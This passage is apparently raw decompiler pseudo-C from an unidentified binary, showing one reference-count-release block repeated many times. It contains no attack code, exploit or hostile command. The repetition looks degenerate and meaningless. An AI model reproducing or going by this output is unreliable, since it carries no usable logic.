code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                